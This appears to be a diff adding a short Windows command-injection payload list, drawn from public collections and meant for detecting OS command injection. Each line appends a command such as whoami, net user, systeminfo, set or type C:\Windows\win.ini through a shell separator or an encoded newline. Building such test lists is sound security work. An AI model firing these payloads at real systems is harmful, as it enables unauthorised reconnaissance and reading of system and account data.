@@ -1,0 +1,28 @@
+# CMDi Windows Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect OS command injection on Windows systems.
+& whoami
+| whoami
+&& whoami
+|| whoami
+; whoami
+& ver
+| ver
+&& ver
+|| ver
+& ipconfig
+| ipconfig
+&& ipconfig
+& ipconfig /all
+| net user
+& net user
+& systeminfo
+| systeminfo
+& dir
+| dir C:\
+& type C:\Windows\win.ini
+& echo %USERNAME%
+| echo %COMPUTERNAME%
+& set
+%0Awhoami
+%0Aipconfig
